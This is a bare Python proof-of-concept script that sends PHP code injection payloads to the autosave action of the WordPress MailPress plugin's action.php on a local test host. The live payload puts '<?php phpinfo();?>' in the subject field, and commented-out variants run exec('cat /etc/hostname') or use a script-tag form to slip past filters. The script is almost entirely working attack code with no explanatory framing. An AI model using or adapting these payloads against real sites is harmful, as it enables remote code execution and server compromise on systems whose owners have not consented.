import requests

url = "http://192.168.1.221:8007/wp-content/plugins/mailpress/mp-includes/action.php"
header = {
    "Host": "192.168.1.221:8007",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "content-type": "application/x-www-form-urlencoded",
    "Connection": "close",
    "cookie": "experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltRmpOMlZpWVdFNExUTTVNRFl0TkRnd05DMDRNRFl6TFRnMFlXSTRaRGhoTURFMVlpST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--fa61bc8250f428fab74992fe3b6e868f5908d932; ",
    "upgrade-insecure-requests": "1"
}
# data1={
#     "action":"autosave",
#     "id":"0",
#     "revision":"-1",
#     "toemail":"",
#     "toname":"",
#     "fromemail":"",
#     "fromname":"",
#     "to_list":"",

#     "Theme":"",
#     "subject":"<?php phpinfo();?>",
#     "html":"",
#     "plaintext":"",
#     "mail_format":"standard",
#     "autosave":"1"
# }
# data1="action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<script language='php'>echo(exec('cat /etc/hostname'))</script>&html=&plaintext=&mail_format=standard&autosave=1"
# data1="action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<%26><script   language='php' %26=''>phpinfo();</script>&html=&plaintext=&mail_format=standard&autosave=1"


data1="action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();?>&html=&plaintext=&mail_format=standard&autosave=1"
r=requests.post(url=url,data=data1,headers=header)
print(r.text)